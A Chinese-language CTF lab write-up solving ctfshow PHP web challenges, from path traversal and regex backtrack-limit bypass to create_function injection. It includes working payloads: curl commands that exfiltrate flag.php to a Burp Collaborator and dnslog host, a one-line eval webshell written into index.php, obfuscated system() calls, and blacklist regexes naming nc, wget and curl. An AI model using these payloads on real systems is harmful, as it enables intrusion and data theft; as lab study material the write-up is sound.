> stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）

那么只要符合判断（也就是有传入ctfshow）
就可以目录穿越任意文件读了

```
?f=/ctfshow/../../../../var/www/html/flag.php
```

学习了一下yu师傅的wp，伪协议或者远程文件包含也可以

## 130

```php
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```

第一个if匹配ctfshow前至少有1个字符，所以直接绕就行

```
?f=ctfshow
```



## 131-正则最大回溯次数绕过

```php
include("flag.php");
if(isset($_POST['f'])){
    $f = (String)$_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f,'36Dctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```

> very very very（省略25万个very）ctfshow

> 考点是 利用正则最大回溯次数绕过
> PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit
> **回溯次数上限默认是 100 万**。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。
>
> 这样我们就可以绕过第一个正则表达式了。

```python
import requests
from urllib.parse import quote,unquote
url = "http://70ca4101-fcf7-4dfd-9820-597ca6dcc16f.challenge.ctf.show/"
r = requests.post(url,data={'f':"aaaa"*250000+"36Dctfshow"})
print(r.text)
```

## 132-&&和||

> 访问/robots.txt,之后访问/admin，获得源代码
>
> 1. 对于“与”（&&） 运算： x && y 当x为false时，直接跳过，不执行y； 
> 2. 对于“或”（||） 运算 ： x || y 当x为true时，直接跳过，不执行y。

```php
if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
    $username = (String)$_GET['username'];
    $password = (String)$_GET['password'];
    $code = (String)$_GET['code'];

    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
        
        if($code == 'admin'){
            echo $flag;
        }
    }
}
```

> 如hint所说，这里主要是&&和||共用时的优先级问题
> `if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin")`
>
> 先是&&：`$code === mt_rand(1,0x36D) && $password === $flag`判断为false，然后就判断`false || $username ==="admin"`
> 从而符合判断，再令code=admin即可得到flag

```
?username=admin&password=&code=admin
```

## 133、135-限制长度的无回显rce

```php
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}

# 135
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("师傅们居然破解了前面的，那就来一个加强版吧");
    }
}
```

通常无回显rce可以尝试把结果外带或者写入到能访问的地方
不过这里限制了长度为6，看了一下出题人的思路，确实学到了
[ctfshow web133和其他命令执行的骚操作_Firebasky的博客-CSDN](https://blog.csdn.net/qq_46091464/article/details/109095382)

其rce是这样的：
假如传入的F如下

```
?F=`$F`;+sleep 3
```

```
那么eval(substr($F,0,6));就是截取到`$F`;
而 $F=`$F`;+sleep 3
也就是说最终执行的就是``$F`;+sleep 3`
```

然后就是考虑如何把flag带出来了

> 出题的师傅做法：
> 利用curl的 -F参数 把flag文件上传到Burp的Collaborator Client
>
> ```
> # payload 
> #其中-F 为带文件的形式发送post请求
> #xx是上传文件的name值，flag.php就是上传的文件 
> 
> ?F=`$F`;+curl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net
> ```

还有就是用dns外带，不过可能碰上带出来只能带1行，或者显示不全的情况，可以尝试用grep、sed和base64处理一下

```
?F=`$F`;+curl `cat flag.php`.7prisu.dnslog.cn
```

如果有写入权限可以试试写到能访问的地方，cp、mv也可以

```
?F=`$F`;+nl flag.php > 1.txt
```



## 134-extract变量覆盖

```php
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
}
```

> `parse_str()` —— 将字符串解析成多个变量
>
> `$_SERVER['QUERY_STRING']` —— url后的查询字符串
>
> `extract()` —— 从数组中将变量导入到当前的符号表

禁止传参key1和key2

先是`parse_str($_SERVER['QUERY_STRING'])`会把传入的字符串解析成变量

然后就利用`extract($_POST);`覆盖变量key1和key2

```
?_POST[key1]=36d&_POST[key2]=36d
```

## 136-|和tee

```php
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
```

利用管道`|`和`tee`把执行结果写入文件里查看即可

```
?c=ls /| tee a
?c=cat f149_15_h3r3 | tee b
```

## 139

```php
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
```

脚本盲打，直接看hint就行

## 137-调用类中函数

```php
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

call_user_func($_POST['ctfshow']);
```

调用类中函数：`类名::函数名`

```
ctfshow=ctfshow::getFlag
```

## 138-call_user_func

```php
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

if(strripos($_POST['ctfshow'], ":")>-1){
    die("private function");
}
```

过滤了137的方法

[PHP: call_user_func - Manual](https://www.php.net/manual/zh/function.call-user-func.php)

![](https://s2.loli.net/2022/01/03/hpDE8394MZsbYeH.png)

call_user_func允许传入数组的，如上调用类中的方法

```
ctfshow[0]=ctfshow&ctfshow[1]=getFlag
```



## 140-正则绕过

```php
if(isset($_POST['f1']) && isset($_POST['f2'])){
    $f1 = (String)$_POST['f1'];
    $f2 = (String)$_POST['f2'];
    if(preg_match('/^[a-z0-9]+$/', $f1)){
        if(preg_match('/^[a-z0-9]+$/', $f2)){
            $code = eval("return $f1($f2());");
            if(intval($code) == 'ctfshow'){
                echo file_get_contents("flag.php");
            }
        }
    }
}
```

![](https://s2.loli.net/2022/01/03/W4slgufqeiK8mMr.png)只要让`intval($code)=0`就可以符合条件了，而intval会将非数字字符转换为0
 那么就构造吧：`code=eval(return $f1($f2());)`，就会执行函数了，外面那层可以用加密函如md5、sha1

```
md5(phpinfo())
md5(md5())
md5(sleep())
current(localeconv)
sha1(getcwd())
```

## 142

```php
if(isset($_GET['v1'])){
    $v1 = (String)$_GET['v1'];
    if(is_numeric($v1)){
        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents("flag.php");
    }
}
```

会sleep很久很久--，那么就是要传入v1使得其为0，直接输出flag
 0和0x0绕过
 这里可以过是因为0和0x0被当成了8进制和16进制

```
?v1=0
?v1=0x0
```



## 141、143、144、145、146-数学运算

```php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/^\W+$/', $v3)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

v3正则匹配非字母数字下划线的字符

要求v1、v2为数字

然后`eval("return $v1$v3$v2;");`

至于要如何rce呢，可以利用到运算==

像1+phpinfo()+1，无论结果如何，都要先执行phpinfo()这个函数，然后再进行相加
同理，可传入：（如果用+记得url编码）

```
v1=1&v2=1&v3=-system('tac f*')-
```

不过得绕过正则，这里可利用yu师傅的脚本构造：[无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_羽的博客-异或绕过](https://blog.csdn.net/miuzzx/article/details/109143413)

```
?v1=1&v2=1&v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)-
```

### 143

```php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

过滤了~，改用异或

```
?v1=1&v2=1&v3=*("%0c%06%0c%0b%05%0d"^"%7f%7f%7f%7f%60%60")("%0b%01%03%00%06%00"^"%7f%60%60%20%60%2a")*
```

### 144

```php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && check($v3)){
        if(preg_match('/^\W+$/', $v2)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}

function check($str){
    return strlen($str)===1?true:false;
}
```

check v3要求其长度为1，不检查v2是否为数字了
还是那个思路，让v3当运算符就行，用v2rce

```
?v1=1&v2=("%0c%06%0c%0b%05%0d"^"%7f%7f%7f%7f%60%60")("%0b%01%03%00%06%00"^"%7f%60%60%20%60%2a")&v3=*
```

### 145

```php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

+-*/都被过滤了，这里用三元运算符exp1?exp2:exp3

```
?v1=%0a1&v2=%0a0&v3=?(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5):
```

### 146

```php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

`:`被ban了，用`|`

```
?v1=1&v2=1&v3=|(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5)|
```

比较`==`也可以

```
?v1=1&v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&v2=1
```



## 147-create_function代码注入

```php
if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
        $ctfshow('',$_GET['show']);
    }
}
```

看正则，要在$ctfshow匹配到一个非数字字母下划线的字符

而要能执行函数，要找的这个字符得是不影响函数使用的

（可以暴力跑）

原理：

> [Code Breaking 挑战赛 Writeup (seebug.org)](https://paper.seebug.org/755/#easy-pcrewaf)
>
> php里默认命名空间是`\`，所有原生函数和类都在这个命名空间中。 
>
> 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。
>
> 如果你在其他namespace里调用系统类，就必须写绝对路径这种写 法



[PHP: create_function - Manual](https://www.php.net/manual/zh/function.create-function.php)

其功能大致是这样：

```php
create_function('$a,$b','return 111');
# 等价于
function a($a, $b){
    return 111;
}
```

且 (之前打比赛碰到，简单记录一下)

> create_function生成的函数名有些特殊，它是`NULL字符加上”lambda_”再加个一个数字标识（\x00lambda_数字标识）`，其中数字标识代表它是当前进程中的第几个匿名函数。create_function的实现步骤如下：
>
> 1. 获取参数, 函数体
> 2. 拼凑一个”function __lambda_func (参数) { 函数体;} “的字符串
> 3. eval之
> 4. 通过__lambda_func在函数表中找到eval后得到的函数体, 找不到就出错
> 5. 定义一个函数名:”\000_lambda_” . count(anonymous_functions)++
> 6. 用新的函数名替换__lambda_func
> 7. 返回新的函数名

那么就可以这样构造绕过：
提前将其闭合+注入代码+将后续代码`注释`或者用`?>`闭合

```php
create_function('$a,$b','return 111;}phpinfo();//');
# 等价于
function a($a, $b){
    return 111;}phpinfo();//;
}
# 这样一来就可以执行注入的代码：phpinfo()了~
```

那么本题：

```
GET:
?show=echo 1;}system('tac f*');//
?show=echo 1;}system('tac f*')?>
POST:
ctf=%5ccreate_function
```

## 148-中文变量

```php
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(preg_match("/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/",$code)){
        die("error");
    }
    @eval($code);
}
else{
    highlight_file(__FILE__);
}

function get_ctfshow_fl0g(){
    echo file_get_contents("flag.php");
}
```

看hint~

异或可以过

```
?code=("%0c%19%0c%5c%60%60"^"%7f%60%7f%28%05%0d") ("%09%01%03%01%06%02"^"%7d%60%60%21%60%28");
```

预期解是使用中文变量：（其实也是异或啦）

```
?code=$哈="`{{{"^"?<>/";${$哈}[哼](${$哈}[嗯]);&哼=system&嗯=tac f*
```

```
"`{{{" ^ "?<>/";  异或出来的结果是  _GET
```

即构造了：`$_GET[哼]($_GET[嗯])`，然后再传进去就行~

## 149-条件竞争

> 你写的快还是我删的快？

```php
$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}

file_put_contents($_GET['ctf'], $_POST['show']);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}
```

预期应该是条件竞争，不过现在限制了请求数

可以用bp开两个爆破，一个不断访问传参，一个不断访问1.php

```
ctf=1.php
show=<?php system('tac /c*');?>
```

也可以写个多线程

还有个非预期：
往index.php里写个一句话：

```
ctf=index.php
show=<?php eval($_POST[1]);?>
```

## 150-日志文件包含

非预期：
ua头写一句话，然后直接包含即可

## 150_plus

> hint:
>
> 这个题一点点小坑：`__autoload()`函数不是类里面的
> `__autoload` — 尝试加载未定义的类 
>
> 最后构造`?..CTFSHOW..=phpinfo`就可以看到phpinfo信息啦 
>
> 原因是`..CTFSHOW..`解析变量成`__CTFSHOW__`然后进行了变量覆盖，因为CTFSHOW是类就会使用 __autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo()
>
> 接下来就是getshell啦
>
> exp:[vulhub/exp.py at master · vulhub/vulhub (github.com)](https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py)

```php
class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE && strrpos($ctf,"log")===FALSE){
    include($ctf);
}
```



